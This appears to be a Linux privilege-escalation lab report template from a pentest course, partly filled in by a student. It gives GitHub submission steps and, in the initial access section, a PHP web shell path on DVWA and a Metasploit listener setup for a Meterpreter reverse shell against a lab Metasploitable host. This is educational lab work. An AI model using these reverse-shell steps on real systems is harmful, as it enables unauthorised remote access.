# 🧪 Student Pentest Walkthrough Template

## 📥 Getting Started

This template is where you’ll track everything you did during your privilege escalation lab.

It mirrors how real penetration testers write reports, track steps, document evidence, and prove exploitation. Your job is to **fork this repo, clone it to your machine, edit this file, then push your work back to your GitHub account**.

---

## 🔹 How to Fork & Use This Template

### 💻 GitHub Desktop Walkthrough for Students

If you’re more comfortable with a graphical interface than the command line, follow these instructions to complete your student pentest walkthrough using **GitHub Desktop**.

---

## 📦 Step-by-Step Instructions

### 🔹 1. Install GitHub Desktop
- Download from: [https://desktop.github.com](https://desktop.github.com)
- Install and log in with your GitHub account

---

### 🔹 2. Fork the Instructor’s Repo
1. Navigate to the [instructor’s GitHub repo](https://github.com/anombyte93/student_privesc) in your browser
2. Click **Fork** in the top-right corner
3. This creates a personal copy under your GitHub username, you will need to have this template open to fill out and the PrivEsc_Walkthrough.md file open at the same time.
4. Now you can just edit this template online by clicking 'edit'. Alternatively, continue following the steps below to edit on your local computer, otherwise begin the PrivEsc_Walkthrough.md now!

---
## Only continue here if you plan to edit on your local PC using a text editor like Trae, VSCode, Notepad++ etc otherwise skip to ## 👤 Student Info 

### 🔹 3. Clone Your Fork with GitHub Desktop
1. Open GitHub Desktop
2. Click **File > Clone Repository**
3. Select the repo you just forked from the list
4. Choose a local folder to store your files
5. Click **Clone**

---

### 🔹 4. Create and Edit Your Walkthrough
1. Open the folder GitHub Desktop cloned to
2. Locate `Student_Privesc_Template.md`
3. Copy it and rename it:

```bash
walkthrough-YOURNAME.md
```

4. Open the file with a text editor (e.g., VSCode, Trae, Notepad++, Sublime Text)
5. Fill out each section as you complete the lab

---

### 🔹 5. Commit and Push Changes
1. Return to GitHub Desktop
2. You’ll see your edited file listed under **Changes**
3. In the summary box, type a message like:

```
"Added my privesc lab walkthrough"
```

4. Click **Commit to main**
5. Click **Push origin** to upload changes to your GitHub fork

---

## 💡 Why This Is Important
- ✅ GitHub is how professionals document, collaborate, and version-control projects
- ✅ Submitting work this way shows you're job-ready
- ✅ Your walkthrough becomes part of your personal cybersecurity portfolio

---

> 💬 If you're stuck at any step, ask your instructor or teaching assistant for help!


## 👤 Student Info

- Name: Koda
- Date: 09/09/2025
- Kali IP: 192.168.0.201
- Metasploitable IP: 192.168.0.73

---

## 🧭 Initial Access

### 🔹 Foothold Method

- What vulnerability did you use to gain access? - msfconsole
- What was the payload? - Payload size: 34926 bytes
- Where did you upload it? - ../../hackable/uploads/shell.php
- What URL did you visit to trigger the reverse shell? - http://192.168.0.73/dvwa/hackable/uploads/shell.php

### 🔹 Listener Details

- What listener did you set up (command)? - $ msfconsole
msf > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf exploit(multi/handler) > set payload php/meterpreter_reverse_tcp
payload => php/meterpreter_reverse_tcp
msf exploit(multi/handler) > set LHOST 192.168.0.201
LHOST => 192.168.0.201
msf exploit(multi/handler) > set LPORT 4444
LPORT => 4444
msf exploit(multi/handler) > run
- What session did you receive back? - [*] Meterpreter session 1 opened (192.168.0.201:4444 -> 192.168.0.73:49822) at 2025-09-09 18:17:47 +0800
- Paste a sample output (e.g. `meterpreter >`)

---

## 🔍 Enumeration with linPEAS

### 🔹 Kernel Version

```
uname -a output:
```

### 🔹 Notable Findings from linPEAS:

- SUID Binaries:
- Writable Cron Jobs or Scripts:
- Credentials in Files:
- Writable PATH folders:
- Anything linPEAS marked as high-risk:

**Use this to decide on your next step.**

---

## 🚩 Exploitation Path

### 🔹 Chosen Privilege Escalation Vector

- What method did you choose to escalate?
- Why was it possible to exploit?
- What did linPEAS say that helped you decide?

### 🔹 Step-by-Step Exploit Commands

```
[Insert exact commands and what each one does]
```

### 🔹 Post-Exploitation Confirmation

```
whoami
id
```

- What did you see? Prove root access with output.

---

## 💾 Optional: Bonus or Mystery Task Attempt

### 🔹 Task Attempted:

- DirtyCow / GTFOBins / Cron / PATH Hijack / Other

### 🔹 Method Used:

- Describe what you found and how you exploited it:

```
Commands and what they did:
```

### 🔹 Did it work?

- What happened?
- Did it give you root or unexpected results?

---

## 🧠 Reflection

- What did you learn about Linux privilege escalation?
- What would you do differently in a real-world pentest?
- What part confused you or surprised you most?

---

## ✅ Final Submission Instructions

Once your walkthrough is completed:

1. Make sure you’ve pushed the final version of `walkthrough-YOURNAME.md` to your GitHub repo

2. **Submit the link** to your GitHub repo OR create a Pull Request to the instructor repo if requested

3. Ask yourself:

   - Did I clearly explain my exploit chain?
   - Is my proof of root access shown?
   - Could another student or pentester follow my steps?

> This file is your **report**, your **evidence**, and your **portfolio piece**. Treat it like a job submission.

